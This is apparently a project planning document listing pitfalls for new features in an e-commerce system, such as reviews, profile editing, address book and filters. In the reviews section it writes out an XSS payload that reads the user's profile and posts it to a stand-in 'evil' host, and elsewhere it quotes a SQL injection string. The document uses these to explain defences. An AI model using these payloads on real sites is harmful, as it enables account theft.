# Domain Pitfalls — v1.2 UI/UX Completion

**Domain:** E-commerce microservices (Spring Boot + JPA + Flyway + Postgres + Next.js OpenAPI codegen)
**Milestone:** v1.2 — Adding 11 visible UI/UX features ON TOP của v1.1 baseline
**Researched:** 2026-04-26
**Confidence:** HIGH (grounded trong v1.1 audit + 2 debug sessions thực tế của project)

> **Scope note:** File này chỉ liệt kê pitfalls khi **ADD** các v1.2 features vào hệ thống đã ship v1.1. Generic security advice (OWASP Top 10) bị loại trừ — chỉ giữ lại điểm xảy ra do tương tác giữa feature mới với architecture hiện hữu (microservices boundary, Flyway, OpenAPI codegen, ApiErrorResponse envelope, traceId, middleware matcher).

---

## Critical Pitfalls

### Pitfall 1: Flyway V4 collision khi multiple PRs cùng tăng version

**What goes wrong:**
v1.1 đã có incident DB-05: order-service có cả `db/migration/V2__add_order_items.sql` (Phase 8) và `db/seed-dev/V2__seed_dev_data.sql` (Phase 5) cùng version=2 → Flyway nghiêm ngặt sẽ throw "duplicate version" và service không boot. Phải rename V2 → V100. v1.2 thêm Wishlist (user-svc), Reviews (product-svc), Address book (user-svc) — nếu 2 phase plan parallel cùng claim V4__ trên cùng service thì collision lặp lại.

**Why it happens:**
- Flyway version là **monotonic per-service**, nhưng plan-phase agents không có lock tập trung — mỗi agent đọc `ls db/migration` rồi tự pick `next = max+1`.
- Project có **5 services dùng Flyway** (user, product, order + 2 khác) → namespace tách biệt, nhưng features v1.2 trùng heavily lên user-svc (wishlist + address-book + profile-edit) và product-svc (reviews + filters).
- Seed data folder (`db/seed-dev/V*__`) và migration folder (`db/migration/V*__`) đang share namespace ở Flyway default config → collision cross-folder như v1.1.

**How to avoid:**
- Reserve version ranges trong `MILESTONES.md` v1.2 section, **assign explicit V-number per feature** trước khi plan-phase chạy:
  - user-svc: V4 wishlist, V5 address_book, V6 profile_avatar_url, V7 user_phone (nếu thiếu)
  - product-svc: V4 reviews, V5 review_aggregates (denormalized rating average + count)
  - order-svc: V4 order_filters_index (composite index status+createdAt+userId)
- Tách `db/migration` (production) và `db/seed-dev` (dev-only) bằng riêng `flyway.locations` per profile, KHÔNG share namespace.
- Pre-commit hook check `find sources/*-service/src/main/resources/db -name "V*__*.sql" | awk -F'V|__' '{print $1"_"$2}' | sort | uniq -d` — fail nếu có duplicate.

**Warning signs:**
- 2 PR cùng touch `V4__` trên cùng service folder.
- Service không boot, log: `FlywayException: Found more than one migration with version 4`.
- Local `mvn spring-boot:run` OK nhưng CI fail (CI thường strict hơn về `validateOnMigrate`).

**Phase to address:** Roadmap setup phase (trước khi spawn plan-phase agents) — register version ranges. Plus: post-merge integration phase verify all services boot.

---

### Pitfall 2: AUTH-06 middleware matcher quá broad → static asset bị gate

**What goes wrong:**
v1.1 closed AUTH-06 ở mức narrow (`['/admin/:path*']` chỉ). v1.2 muốn mở rộng `/account|/profile|/checkout`. Naïve approach: `matcher: ['/((?!_next/static|_next/image|favicon.ico).*)']` → middleware chạy cho **mọi route** kể cả homepage, dẫn đến SSR slowdown + auth check trên `/api/healthz`. Ngược lại nếu quá narrow (`['/profile/:path*']`) → bypass `/profile` chính nó (Next.js matcher KHÔNG auto-include parent path), user direct visit `/profile` không bị bounce.

**Why it happens:**
- Next.js `config.matcher` semantics: `/profile/:path*` match `/profile/x/y` nhưng KHÔNG match `/profile` (cần `/profile/:path*` + `/profile` riêng, hoặc `/profile{/:path*}?` với named groups — phụ thuộc Next version).
- middleware.ts chạy trên **edge runtime** → cẩn thận với JWT verify (jose library OK, jsonwebtoken KHÔNG OK trên edge).
- v1.1 compensating control là `http.ts` 401 redirect — đã có incident login redirect loop khi redirect áp dụng cho cả endpoint `/api/users/auth/login` chính nó.

**How to avoid:**
- Matcher pattern explicit cover root + nested:
  ```ts
  export const config = {
    matcher: [
      '/admin/:path*', '/admin',
      '/profile/:path*', '/profile',
      '/account/:path*', '/account',
      '/checkout/:path*', '/checkout',
    ],
  }
  ```
- KHÔNG include `/api/users/auth/*` vào matcher (auth endpoints phải public).
- Test matcher bằng unit test với mock `NextRequest`.
- Verify SSR direct visit (curl với cookie chưa set) → `/profile` phải redirect 307 sang `/login?returnTo=%2Fprofile`.

**Warning signs:**
- DevTools Network: middleware chạy cho `/_next/static/...` (lớn delay TTFB).
- User trực tiếp paste `/profile` URL vẫn load được (chỉ data client-side fail).
- Login redirect loop tái xuất hiện (audit `AUTH_PATHS_NO_REDIRECT` trong http.ts vẫn còn).

**Phase to address:** Phase 9 (residual closure — AUTH-06). Verification: Playwright test `direct-visit-protected-route.spec.ts`.

---

### Pitfall 3: Reviews — XSS qua review content (rich text / markdown)

**What goes wrong:**
User submit review chứa `<script>alert(1)</script>` hoặc `<img src=x onerror=fetch('/api/users/me').then(r=>r.json()).then(d=>fetch('//evil',{method:'POST',body:JSON.stringify(d)}))>`. Nếu FE render bằng `dangerouslySetInnerHTML` (vì muốn support **kbd**, line break, link) → stored XSS, kẻ tấn công đọc được session/JWT từ localStorage của user khác xem review.

**Why it happens:**
- Reviews UI thường muốn format nhẹ (line break, link) → developer reach for `dangerouslySetInnerHTML` thay vì `<p>{content}</p>` (React tự escape).
- Backend Spring Boot Jackson tự escape JSON nhưng KHÔNG sanitize HTML — nó echo lại đúng input.
- Project dùng JWT trong localStorage (xác nhận từ AUTH-05 v1.1) → XSS = full account takeover.

**How to avoid:**
- **FE:** Render plain text (`{content}` trong JSX). Nếu cần line break: `content.split('\n').map(...)`. Nếu cần markdown: dùng `react-markdown` với `disallowedElements=['script','iframe','style']` và `unwrapDisallowed=true`.
- **BE (defense in depth):** Sanitize trong `ReviewEntity.@PrePersist` bằng OWASP Java HTML Sanitizer: `Sanitizers.FORMATTING.and(Sanitizers.LINKS).sanitize(content)`.
- **Validation:** Length cap 2000 chars, reject nếu match `/<\s*(script|iframe|object|embed)/i`.
- Migrate JWT từ localStorage sang httpOnly cookie là invisible hardening → defer (per project policy), nhưng XSS vẫn nguy hiểm cho session token nên sanitize là MUST.

**Warning signs:**
- Code review thấy `dangerouslySetInnerHTML={{__html: review.content}}`.
- Review content lưu raw có ký tự `<` `>` không escape ở DB.
- E2E test viết: `await page.fill('textarea[name=content]', '<b>bold</b>')` rồi assert text — cần thêm assertion KHÔNG có element `<b>` thực.

**Phase to address:** Phase planning Reviews feature. Verification: Playwright XSS payload test + manual paste OWASP XSS cheat sheet payloads.

---

### Pitfall 4: Reviews — Rating average drift on edit/delete (denormalized count + sum)

**What goes wrong:**
Naïve approach: lưu `Product.averageRating` + `Product.reviewCount` denormalized trên ProductEntity, update trong `ReviewService.create()` bằng `product.averageRating = (avg*count + newRating) / (count+1)`. Khi user **edit** review từ 5 sao xuống 1 sao, code chỉ +1 cho count mới hoặc bỏ qua → average drift dần khỏi truth. Khi **delete** review, nếu race condition 2 delete song song, count có thể trừ 2 lần.

**Why it happens:**
- Floating point drift sau nhiều update — không bao giờ khớp lại với SUM/COUNT thực.
- Edit flow developer thường viết: `update review.rating; recalculate using formula` thay vì recompute từ scratch.
- Race condition: 2 transactions cùng đọc `averageRating=4.5, count=100`, cùng tính rồi cùng write → một update bị mất (lost update).

**How to avoid:**
- **Option A (recommended cho MVP):** KHÔNG denormalize. Tính on-the-fly: `SELECT AVG(rating), COUNT(*) FROM reviews WHERE product_id = ?`. Cache 60s in-memory hoặc Redis nếu có. Đơn giản, không drift.
- **Option B (nếu cần performance):** Denormalize nhưng dùng SQL trigger hoặc `@PostPersist/@PostUpdate/@PostRemove` recompute từ scratch:
  ```sql
  UPDATE products SET avg_rating = (SELECT AVG(rating) FROM reviews WHERE product_id = ?),
                       review_count = (SELECT COUNT(*) FROM reviews WHERE product_id = ?)
  WHERE id = ?;
  ```
  Bọc trong `@Transactional(isolation = REPEATABLE_READ)` hoặc dùng `SELECT ... FOR UPDATE` trên products row.
- **Option C:** Event-sourced — append-only ratings table, materialized view refresh nightly. Overkill cho project này.

**Warning signs:**
- `averageRating` có giá trị `4.4999999...` hoặc `5.0000001` (floating point drift).
- Test scenario: tạo 10 review 5 sao → edit 1 review xuống 1 sao → delete cùng review → assert avg = 5.0 với 9 review remaining. Naïve impl sẽ fail.
- N+1: list product page query `SELECT AVG/COUNT` cho mỗi product (100 products = 200 queries).

**Phase to address:** Phase planning Reviews feature. Pick Option A trừ khi benchmark cho thấy product list page > 500ms với 100 products.

---

### Pitfall 5: Reviews — N+1 queries trên product list / detail

**What goes wrong:**
Product detail page show "5 reviews mới nhất" + average rating + total count. Code naïve: `productRepo.findBySlug(slug)` rồi `reviewRepo.findTop5ByProductIdOrderByCreatedAtDesc(id)` rồi với mỗi review `userRepo.findById(review.userId)` để lấy displayName → 1 + 1 + 5 = 7 queries cho 1 page load. Nhân lên product list (20 products × rating count) = 41 queries.

**Why it happens:**
- Microservices: review-data sống trong product-service, user displayName sống trong user-service → KHÔNG thể JOIN trực tiếp ở SQL level.
- JPA `@OneToMany(fetch = LAZY)` mặc định lazy → mỗi access trigger query.
- Reviewer name "khách hàng ẩn danh" nghe đơn giản nhưng UX yếu → developer cố fetch user-svc.

**How to avoid:**
- **Denormalize reviewer displayName + avatarUrl vào ReviewEntity** lúc create (snapshot). Nếu user đổi tên sau đó, review hiển thị tên cũ — acceptable cho UX (giống Amazon).
- Bulk fetch: `reviewRepo.findByProductIdInOrderByCreatedAtDesc(productIds)` cho list page, group ở service layer.
- Pagination: KHÔNG load all reviews. Default page size 10, infinite scroll hoặc "Load more".
- Spring Data JPA `@EntityGraph` để eager load nếu cùng service.

**Warning signs:**
- Spring Boot log với `spring.jpa.show-sql=true`: cùng query lặp 10+ lần per request.
- Browser Network: product detail TTFB > 800ms.
- p95 latency tăng linear với số reviews.

**Phase to address:** Phase planning Reviews feature. Verification: enable `show-sql=true` trên dev profile, manual count queries per request type (target: ≤ 3 queries cho product detail).

---

### Pitfall 6: Address book — soft-delete vs hard-delete khi address tham chiếu trong Order

**What goes wrong:**
v1.1 PERSIST-02 đã ship: order lưu `shippingAddress` JSON snapshot trong `OrderItemEntity` (đúng pattern). v1.2 Address book thêm `AddressEntity` table, user có thể delete address. Naïve hard-delete: `DELETE FROM addresses WHERE id = ?`. Nếu order_v2 (chưa ship) reference address_id qua FK → constraint violation. Nếu KHÔNG có FK (chỉ snapshot JSON) → orphaned reference, admin sau này click "edit shipping address của order" → 404.

**Why it happens:**
- Developer mới quen pattern reference (`order.shippingAddressId`) thay vì snapshot (`order.shippingAddressJson`).
- v1.1 đã chọn snapshot pattern (correct), nhưng Address book introduce table mới và developer dễ migrate sang FK reference.
- Soft-delete (`deleted_at`) làm query phức tạp + cần filter ở mọi list endpoint.

**How to avoid:**
- **GIỮ snapshot pattern:** Khi user checkout, copy address fields vào `OrderItemEntity.shippingAddress` JSON (đã ship v1.1). KHÔNG tạo FK từ order → address.
- Address table chỉ là "saved addresses for autofill", KHÔNG phải source of truth cho order.
- Hard-delete an toàn: `DELETE FROM addresses WHERE id = ?` không ảnh hưởng order vì không FK.
- UI: confirm modal "Xóa địa chỉ này? Đơn hàng đã đặt KHÔNG bị ảnh hưởng (đã lưu địa chỉ giao hàng riêng)."

**Warning signs:**
- Schema có `orders.shipping_address_id BIGINT REFERENCES addresses(id)` — sai pattern.
- Code: `order.getShippingAddress()` query qua AddressRepo thay vì đọc từ JSON column.
- Khi delete address, app throw FK constraint error.

**Phase to address:** Phase planning Address book. Verification: integration test create order → delete address used → query order → shippingAddress vẫn đầy đủ.

---

### Pitfall 7: Address book — default-flag concurrency

**What goes wrong:**
User có 3 addresses, address A đang `is_default=true`. User mở 2 tab, tab1 set B làm default (`UPDATE addresses SET is_default=false WHERE user_id=?; UPDATE addresses SET is_default=true WHERE id=B`), tab2 cùng lúc set C. Race: cả 2 unset xong cả 2 set → DB có B và C cùng `is_default=true`. Checkout autofill bốc nhầm.

**Why it happens:**
- "Exactly one default" không thể enforce bằng simple column constraint trên Postgres.
- Service code thường viết 2 UPDATE riêng, không atomic.

**How to avoid:**
- **Partial unique index:** `CREATE UNIQUE INDEX idx_one_default_per_user ON addresses(user_id) WHERE is_default = true;` — Postgres reject second insert/update vào is_default=true cho cùng user.
- Service code wrap trong `@Transactional` với `SERIALIZABLE` isolation hoặc `SELECT ... FOR UPDATE` lock user row trước.
- FE optimistic UI: disable button khác trong khi mutation chạy.

**Warning signs:**
- Khi list addresses thấy 2 row `is_default=true`.
- Test: Promise.all 2 setDefault concurrent → cả 2 success (không có error).
- Checkout autofill nhảy giữa các address.

**Phase to address:** Phase planning Address book. Migration V5__address_book.sql phải include partial unique index.

---

### Pitfall 8: Profile editing — password change without old-password verify

**What goes wrong:**
Endpoint `PATCH /api/users/me` accept `{password: "newpass"}` trực tiếp update qua BCrypt. Nếu attacker steal session token (XSS từ Pitfall 3, hoặc token leak qua logs) → đổi mật khẩu → lockout user vĩnh viễn vì attacker biết password mới còn user thì không.

**Why it happens:**
- v1.1 AUTH-01..05 build login/register, KHÔNG có change-password flow → developer mới add v1.2 dễ extend `PATCH /me` chung cho mọi field.
- "Đã authenticated thì cho làm gì cũng được" mindset.

**How to avoid:**
- Tách endpoint: `PATCH /api/users/me` chỉ cho fullName/phone/avatar, **KHÔNG cho password/email**.
- `POST /api/users/me/password` require body `{oldPassword, newPassword}`, BE verify oldPassword qua BCrypt match trước khi update.
- Sau khi đổi password thành công, invalidate tất cả JWT khác của user (cần token version trong claims, hoặc accept rằng JWT cũ vẫn valid đến hết 24h — MVP acceptable nhưng document risk).
- Rate limit endpoint password change: max 5 attempts / 15 phút.

**Warning signs:**
- `UserCrudService.update()` accept `passwordHash` trong DTO patch.
- Swagger schema `UpdateUserRequest` có field `password`.
- Penetration test: capture JWT, gọi PATCH với password mới, login bằng password mới → success.

**Phase to address:** Phase planning Profile editing. Verification: integration test reject PATCH với password field, success qua dedicated endpoint chỉ khi oldPassword đúng.

---

### Pitfall 9: Profile editing — email change without verification

**What goes wrong:**
User đổi email thành email của attacker (hoặc typo). System gửi notification về email mới mà không verify → forgot-password flow gửi reset link về email attacker → account takeover. Hoặc user typo email → mất account vĩnh viễn vì không nhận được forgot-password.

**Why it happens:**
- "Email là PII công khai, đổi tự do" mindset từ developer chưa từng làm production e-com.
- Notification service đã có (verified v1.0), gửi mail dễ → developer bỏ qua verify step.

**How to avoid:**
- **Pattern 2-step:** `POST /api/users/me/email/request {newEmail}` → BE generate token, lưu `email_change_pending` table, send link về newEmail. User click link → `GET /api/users/me/email/confirm?token=...` → mới apply.
- Trong khi pending, login email vẫn là email cũ.
- **Hoặc đơn giản hơn cho MVP:** Disable email change UI hoàn toàn ở v1.2, nói "Liên hệ admin để đổi email." Document làm tech debt v1.3+.

**Warning signs:**
- `PATCH /api/users/me` accept email field, không có separate flow.
- Test: đổi email → forgot-password gửi link đến email mới ngay → verify fail.

**Phase to address:** Phase planning Profile editing. Recommend disable email field cho v1.2 (visible-first priority cho phép defer hardening — đây không phải hardening invisible, đây là protection thật).

---

### Pitfall 10: Profile editing — avatar upload size/MIME bypass

**What goes wrong:**
FE accept `<input type="file" accept="image/*">` rồi POST multipart. Naïve BE: `MultipartFile.transferTo(path)` không check anything → user upload `.exe`, `.html` (XSS qua avatar URL), 10GB file (DoS), polyglot file (image header + JS payload).

**Why it happens:**
- `accept="image/*"` chỉ là FE hint, attacker bypass dễ bằng curl.
- MIME type từ `MultipartFile.getContentType()` đến từ client header — attacker control được.
- Spring Boot default `spring.servlet.multipart.max-file-size=1MB` nhưng nhiều dev tăng lên 100MB cho "tiện".

**How to avoid:**
- **Magic byte check (server-side):** Đọc 12 bytes đầu, match với `[0xFF,0xD8,0xFF]` (JPEG), `[0x89,0x50,0x4E,0x47]` (PNG), `[0x47,0x49,0x46,0x38]` (GIF), `[0x52,0x49,0x46,0x46...0x57,0x45,0x42,0x50]` (WebP). Reject mọi thứ khác.
- Re-encode image qua `ImageIO.read()` + `ImageIO.write()` → strip EXIF, neutralize polyglot.
- Resize cap max 1024x1024.
- File size cap 2MB (`spring.servlet.multipart.max-file-size=2MB`).
- Lưu với random UUID filename, KHÔNG dùng original filename (path traversal).
- Serve qua endpoint `/api/users/avatar/{userId}` với `Content-Type` ép từ server, KHÔNG serve trực tiếp từ filesystem.
- KHÔNG store trong `/static/` (nếu store local) — store trong volume riêng để không cache hash.

**Warning signs:**
- Code: `file.transferTo(new File("uploads/" + file.getOriginalFilename()))` — path traversal.
- Test upload file `evil.html` → 200 OK → access URL → render HTML.
- Test upload 50MB file → 200 OK → disk full.

**Phase to address:** Phase planning Profile editing. Verification: penetration test với polyglot/path traversal/oversized payload.

---

### Pitfall 11: Order filtering — date range timezone bugs

**What goes wrong:**
User Việt Nam (UTC+7) chọn "đơn hàng trong tháng 4/2026". FE gửi `from=2026-04-01&to=2026-04-30`. BE parse `LocalDate` → `2026-04-30 00:00:00 UTC` → query miss đơn đặt lúc 22:00 ngày 30/4 giờ VN (= 15:00 UTC 30/4 — vẫn match) NHƯNG đơn đặt 06:30 sáng 1/5 giờ VN (= 23:30 30/4 UTC) lại match nhầm. Hoặc `to=2026-04-30` exclusive vs inclusive bound — UI hiển thị "đến 30/4" user nghĩ inclusive nhưng code `< to` exclusive.

**Why it happens:**
- Postgres `TIMESTAMP WITH TIME ZONE` lưu UTC, nhưng Java `LocalDateTime` không carry timezone.
- Frontend `new Date('2026-04-30').toISOString()` ra `2026-04-30T00:00:00.000Z` (UTC midnight) — dùng làm filter `to` thì miss cả ngày 30/4 giờ VN.
- Inclusive vs exclusive: `BETWEEN` là inclusive; `< to` là exclusive.

**How to avoid:**
- **Convention "[from, to)"**: Document rằng `to` là exclusive ngày kế tiếp. UI hiển thị "30/4" → FE compute `to = '2026-05-01'` trước khi gửi.
- Truyền timezone từ FE: `from=2026-04-01T00:00:00+07:00&to=2026-05-01T00:00:00+07:00`. BE parse `OffsetDateTime` (giữ offset) hoặc convert sang `Instant`.
- Postgres: `WHERE created_at >= ? AND created_at < ?` với cả 2 là `OffsetDateTime`.
- Test boundary: đơn lúc 2026-04-30T23:59:59+07:00 phải match khi user filter "tháng 4". Đơn lúc 2026-05-01T00:00:01+07:00 không match.

**Warning signs:**
- Đơn lúc 23:00 hiển thị ở filter ngày kế tiếp.
- "Đơn cuối tháng" lúc consistent miss.
- Code dùng `LocalDate.atStartOfDay()` không có ZoneId.

**Phase to address:** Phase planning Order filtering. Pick `OffsetDateTime` everywhere, document `[from, to)` convention trong OpenAPI spec.

---

### Pitfall 12: Order filtering — query param injection / OpenAPI schema mismatch

**What goes wrong:**
Naïve impl: `repo.findByStatusAndCreatedAtBetween(status, from, to)` với status là String — Spring Data JPA dùng PreparedStatement nên SQL injection thấp. NHƯNG nếu code build dynamic query bằng `JPQL "SELECT o WHERE o.status = '" + status + "'"` thì injection. Hoặc OpenAPI schema khai báo `status: enum [PENDING,PAID,SHIPPED]` nhưng BE accept any string → FE typed client send đúng nhưng curl gửi `?status=' OR 1=1 --` được (defense in depth fail).

**Why it happens:**
- v1.1 đã có pipeline OpenAPI codegen → FE typed module enforce enum. Developer assume "FE đúng thì BE không cần validate enum".
- Spring Boot `@RequestParam String status` không tự reject enum invalid.

**How to avoid:**
- Use `@RequestParam OrderStatus status` (Java enum) thay vì String — Spring tự reject 400 Bad Request nếu invalid.
- Spring Data `@Query` với named params (`:status`) hoặc method derivation — tránh string concat.
- OpenAPI spec đồng bộ: enum trong schema phải match Java enum; codegen verify trên FE side.
- Validate from < to (server-side), reject if violated.
- Cap `pageSize <= 100` để chống DoS qua pagination.

**Warning signs:**
- BE log: `org.hibernate.exception.SQLGrammarException` khi user nhập ký tự lạ.
- OpenAPI doc enum khác implementation.
- Curl `?status=INVALID` trả 200 với empty array thay vì 400.

**Phase to address:** Phase planning Order filtering + Advanced search filters. Add Bean Validation `@Pattern` hoặc enum binding.

---

### Pitfall 13: Order filtering — cursor pagination drift

**What goes wrong:**
Offset pagination (`?page=2&size=20`) bị drift khi data thay đổi: user xem page 2, có đơn mới được tạo → page 3 hiển thị item đã thấy ở page 2 (duplicate) hoặc miss item. UX confusing.

**Why it happens:**
- Default Spring Data `Pageable` dùng OFFSET/LIMIT.
- E-commerce orders constantly thêm mới → drift mạnh ở list cao traffic.

**How to avoid:**
- **Cursor pagination:** Sort by `(created_at DESC, id DESC)` (id để tie-break). Cursor = base64 của `last_created_at + last_id`. Query: `WHERE (created_at, id) < (?cursorCreatedAt, ?cursorId)`.
- Hoặc giữ offset cho admin (nhỏ, low-write) + cursor cho user-facing order list.
- Document trong OpenAPI: `nextCursor: string | null` field trong response.

**Warning signs:**
- User report "đơn xuất hiện 2 lần ở page khác nhau".
- Admin báo "tổng count khác sum của các page".

**Phase to address:** Phase planning Order filtering. Cho v1.2 visible-first, OFFSET có thể acceptable nếu volume thấp; document tech debt.

---

### Pitfall 14: Wishlist — duplicate add race + stale stock display

**What goes wrong:**
- **Race:** User double-click "Add to wishlist" → 2 POST đồng thời → 2 row trong wishlist_items. Hoặc giữa 2 tab.
- **Stale stock:** Wishlist render thumbnail + price + "Còn hàng" badge từ snapshot lúc add. 1 tuần sau, sản phẩm hết hàng / đổi giá → user mở wishlist thấy "Còn hàng" → click "Add to cart" → 409 STOCK_SHORTAGE confused.

**Why it happens:**
- Race: không có unique constraint `(user_id, product_id)`.
- Stale: dev snapshot để giảm queries, KHÔNG fetch live.

**How to avoid:**
- **Race:** Migration include `UNIQUE INDEX idx_wishlist_unique ON wishlist_items(user_id, product_id)`. BE catch `DataIntegrityViolationException` → 200 idempotent (đã có sẵn, OK). FE button disable trong khi mutation pending.
- **Stale stock:** Wishlist API JOIN với product live data (1 query: `SELECT w.*, p.stock, p.price FROM wishlist_items w JOIN products p ON ... WHERE user_id=?`). Vì wishlist + product cùng product-svc (hoặc user-svc nếu wishlist ở user-svc) — check service boundary. Nếu khác service: gọi product-svc batch endpoint `POST /api/products/batch {ids:[]}`.
- "Move to cart" button disabled / hiển thị "Hết hàng" nếu stock=0 sau JOIN.

**Warning signs:**
- DB query: 2 row cùng `(user_id, product_id)`.
- User báo "đã thêm vào wishlist nhưng add to cart báo hết hàng".
- Wishlist page price khác product detail page.

**Phase to address:** Phase planning Wishlist. Migration unique constraint từ V4. Wishlist list endpoint phải JOIN product live.

---

### Pitfall 15: Wishlist — infinite scroll memory leak

**What goes wrong:**
User cuộn 200 items, browser giữ tất cả ảnh + DOM nodes → tab ăn 500MB+ RAM, scroll lag. Trên mobile crash.

**Why it happens:**
- Dùng IntersectionObserver thuần + append vào array → mọi thứ stay mounted.
- Next.js `Image` component không tự virtualize.

**How to avoid:**
- **Pagination thường (page 1, 2, 3...) thay vì infinite scroll** cho wishlist (UX phù hợp hơn — user hiếm khi có > 50 items).
- Nếu MUST infinite scroll: `react-window` hoặc `@tanstack/react-virtual` để chỉ render visible.
- Cap items per page = 20.

**Warning signs:**
- Lighthouse Performance score drop trên page wishlist.
- DevTools Memory profiler cho thấy detached nodes tăng linear với scroll.

**Phase to address:** Phase planning Wishlist. Recommend pagination UI thay infinite scroll cho v1.2.

---

### Pitfall 16: Advanced search filters — facet count caching staleness

**What goes wrong:**
Sidebar hiển thị "Brand: Dell (24), Asus (18), HP (12)". Counts được cache 5 phút. Admin xóa 10 sản phẩm Dell → user filter Dell → 14 results nhưng badge vẫn nói 24 → user confused, hoặc user filter "in_stock=true" nhưng count chưa cập nhật stock change.

**Why it happens:**
- Tính facet exact realtime = expensive (multiple GROUP BY queries).
- TTL cache đơn giản nhưng không invalidate khi data thay đổi.

**How to avoid:**
- **MVP-friendly:** Tính facets theo current filter set, KHÔNG cache (acceptable nếu < 10K products, query trên indexed columns < 200ms).
  ```sql
  SELECT brand, COUNT(*) FROM products
   WHERE (price BETWEEN ? AND ?) AND in_stock = ?
   GROUP BY brand;
  ```
- Nếu cần cache: invalidate khi `ProductService.create/update/delete` (event hook), KHÔNG just TTL.
- Document "counts là estimate, có thể off plus minus 5%".

**Warning signs:**
- Click filter Dell → count khác badge.
- Admin update product → user search vẫn thấy data cũ > 1 phút.

**Phase to address:** Phase planning Advanced search filters. v1.2 visible-first → no cache, recompute mỗi request.

---

### Pitfall 17: Advanced search filters — OR vs AND logic confusion + URL state explosion

**What goes wrong:**
- **Logic:** User check Brand=Dell và Brand=Asus → expect "Dell HOẶC Asus" (OR within same facet). Nhưng cũng check "Price 10-20M" → expect "(Dell OR Asus) AND (Price)". Naïve AND-everything → 0 results mọi lúc.
- **URL state:** Mỗi filter là URL param → `?brand=Dell&brand=Asus&price_min=10&price_max=20&rating=4&in_stock=1&sort=price_asc&page=2&keyword=...` → URL > 2KB → một số proxy (gateway?) cap header size, request fail. Plus: SEO/share link không stable khi filter thay đổi order.

**Why it happens:**
- Pure SQL: `WHERE brand IN (?) AND price BETWEEN ? AND ?` đúng pattern.
- URL: developer dùng từng param riêng thay vì single encoded state.

**How to avoid:**
- **Logic:** Same-facet = OR (`IN (...)`), cross-facet = AND. Pattern này industry-standard (Amazon, Tiki).
- **URL state:**
  - Stable param order (alphabetical) qua `URLSearchParams` sort.
  - Các param dạng array dùng comma-separated: `?brands=Dell,Asus` (1 param) thay vì `?brand=Dell&brand=Asus` (2 param) — ngắn hơn.
  - Nếu state phức tạp (> 5 params): consider POST-style search với short-id token (server lưu filter state, URL chỉ ref token) — overkill cho v1.2.
- Test với 10 filter active → URL phải < 1KB.

**Warning signs:**
- User check 2 brand → thấy 0 result (nên có ≥ kết quả của 1 brand).
- URL > 2KB → 414 Request-URI Too Long.
- Share link với colleague → kết quả khác do param order.

**Phase to address:** Phase planning Advanced search filters. Lock contract trong OpenAPI: query param `brands` là CSV.

---

### Pitfall 18: Homepage redesign — hero image LCP regression

**What goes wrong:**
Hero banner 1920x800 PNG 2MB → LCP > 4s → Lighthouse drop từ 90 xuống 50, SEO penalty, user bounce. v1.1 homepage có thể đơn giản (không hero) → v1.2 thêm hero là regression risk lớn nhất với Web Vitals.

**Why it happens:**
- Designer giao PNG full quality không nén.
- Dev không dùng `next/image` `priority` prop cho above-fold image.
- Dev dùng `<img>` thay vì `<Image>` để "tránh cấu hình".

**How to avoid:**
- `<Image src="/hero.webp" priority sizes="100vw" width={1920} height={800} alt="..." />` — `priority` preload, `sizes` cho responsive.
- Convert hero sang WebP (cap 200KB) hoặc AVIF. Có 2 size: mobile (768x400) + desktop (1920x800), `srcSet` qua `next/image` tự handle.
- Nếu hero là carousel: chỉ slide đầu tiên `priority`, các slide sau lazy.
- Preload hint: `<link rel="preload" as="image" href="/hero.webp" />` trong `<head>` (Next.js `<Head>`).

**Warning signs:**
- Lighthouse CI fail với LCP > 2.5s.
- Network tab: hero.png là 2MB.
- Dev tool "Largest Contentful Paint" element là hero PNG.

**Phase to address:** Phase planning Homepage redesign. Lighthouse budget gate trong CI: LCP < 2.5s, image < 500KB.

---

### Pitfall 19: Homepage redesign — featured product cache mismatch

**What goes wrong:**
Featured products hiển thị từ Redis cache 1 hour. Admin update giá / xóa product / sold out → homepage vẫn show cũ. User click → 404 hoặc giá khác. Worse: payment-svc tính giá theo product hiện tại, FE display giá cache → user submit giá sai → mismatch ở checkout.

**Why it happens:**
- Featured = curated list, dev cache để giảm DB load.
- Cache TTL fixed without invalidation hooks.

**How to avoid:**
- **Cache structure:** Cache featured **product IDs** (lightweight), nhưng product data luôn fetch fresh từ DB / service.
- Hoặc cache full data nhưng TTL ngắn (60s) + invalidate trên admin product mutation.
- v1.2 với traffic thấp: KHÔNG cache, query trực tiếp với `LIMIT 8` trên indexed `featured=true` column.

**Warning signs:**
- Click featured product → "Sản phẩm không tồn tại" 404.
- Giá ở homepage khác giá ở product detail.
- v1.1 đã có pattern "stock snapshot trong cart bị drift" — homepage cache cùng class problem.

**Phase to address:** Phase planning Homepage redesign. Recommend no-cache cho v1.2, document tech debt.

---

### Pitfall 20: Product detail — image gallery a11y/keyboard nav

**What goes wrong:**
Gallery built bằng `onClick` thuần trên `<div>` → screen reader không announce, keyboard user không tab vào được. Arrow keys không chuyển ảnh. Modal lightbox mở mà không trap focus → tab thoát ra background, Esc không close. Lighthouse Accessibility score drop.

**Why it happens:**
- Gallery library nhiều cái không a11y-compliant.
- Dev test bằng mouse, không test keyboard.

**How to avoid:**
- Dùng Radix UI Dialog hoặc Headless UI cho lightbox — tự handle focus trap + Esc.
- Image thumbnails là `<button>` (không phải `<div onClick>`), `aria-label="Xem ảnh thứ N"`, `aria-current="true"` cho thumbnail active.
- Keyboard: ArrowLeft/ArrowRight chuyển ảnh, Enter mở lightbox, Esc đóng.
- Test bằng Tab key alone — phải tab được vào mọi thumbnail.

**Warning signs:**
- Lighthouse "Buttons do not have an accessible name".
- Screen reader (NVDA/VoiceOver) đọc "div" thay vì "Image 2 of 5".
- Tab key skip qua gallery.

**Phase to address:** Phase planning Product detail enhancements. axe-core check trong Playwright.

---

### Pitfall 21: Product detail — breadcrumb mismatch trên dynamic categories

**What goes wrong:**
Breadcrumb: "Trang chủ > Laptop > Dell". Nếu user vào product qua search (không qua category), category nào hiển thị? Nếu product thuộc 2 categories ("Laptop" và "Gaming"), breadcrumb pick cái nào? Nếu admin đổi tên category → breadcrumb cũ stale do SSG cache.

**Why it happens:**
- Schema product → category là many-to-many hoặc primary category không rõ.
- Breadcrumb generated tại build time (Next ISR/SSG), category change không trigger revalidate.

**How to avoid:**
- Schema: thêm `products.primary_category_id` (nullable, fallback to first if null).
- Breadcrumb đến từ `primary_category` chỉ, KHÔNG cố infer từ referrer.
- Nếu dùng ISR: `revalidate: 60` + on-demand revalidation từ admin webhook khi category đổi.
- v1.2 đơn giản: SSR thuần (không SSG) cho product detail → luôn fresh, accept latency cost.

**Warning signs:**
- 2 user vào cùng product link, thấy breadcrumb khác nhau.
- Admin đổi tên category → product detail vẫn tên cũ.

